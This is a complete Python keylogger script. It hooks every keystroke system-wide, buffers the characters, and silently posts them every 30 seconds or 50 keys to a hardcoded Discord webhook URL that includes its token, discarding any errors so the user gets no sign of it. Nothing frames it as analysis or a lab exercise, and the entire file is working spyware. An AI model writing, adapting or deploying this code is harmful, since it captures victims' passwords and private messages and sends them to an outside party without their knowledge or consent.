import keyboard
import time
import requests
from threading import Lock

WEBHOOK_URL = "https://discord.com/api/webhooks/1335699211785605301/gMerBNCpsDe5rNbw0Hf5o6Idp8ft1Y1nRUN68-dR_p34U8yv6BRZgJprFnVdqs2aZ7MZ"

class KeyLogger:
    def __init__(self):
        self.buffer = []
        self.lock = Lock()
        self.last_send = time.time()

    def start(self):
        keyboard.hook(self._key_handler)
        self._run()

    def _key_handler(self, event):
        with self.lock:
            char = event.name
            if len(char) > 1:
                char = f"[{char.upper()}]"
            
            self.buffer.append(char)
            
            if len(self.buffer) >= 50 or (time.time() - self.last_send) > 30:
                self._flush()

    def _flush(self):
        if not self.buffer:
            return

        try:
            requests.post(
                WEBHOOK_URL,
                json={"content": "".join(self.buffer)},
                timeout=3
            )
            self.buffer.clear()
            self.last_send = time.time()
        except:
            pass

    def _run(self):
        while True:
            time.sleep(1)

if __name__ == "__main__":
    logger = KeyLogger()
    logger.start()
